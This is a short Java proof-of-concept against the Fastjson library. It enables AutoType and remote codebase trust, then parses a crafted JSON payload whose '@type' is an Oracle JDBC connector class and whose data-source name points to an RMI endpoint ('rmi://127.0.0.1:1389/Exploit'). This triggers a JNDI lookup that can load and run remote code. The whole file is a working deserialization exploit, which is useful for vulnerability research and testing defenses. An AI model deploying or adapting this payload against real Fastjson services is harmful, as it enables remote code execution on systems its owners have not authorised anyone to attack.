package poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Ojdbc14 {
    static {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

    }

    public static void main(String[] args)  throws Exception{
//        oracle.jdbc.connector.OracleManagedConnectionFactory;
        fastjson();
    }

    static void fastjson(){
        String json;
        json = "{\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"rmi://127.0.0.1:1389/Exploit\"}";
        Object object = JSON.parseObject(json);
        System.out.println("type:"+ object.getClass().getName() +" "+ object);
    }

}
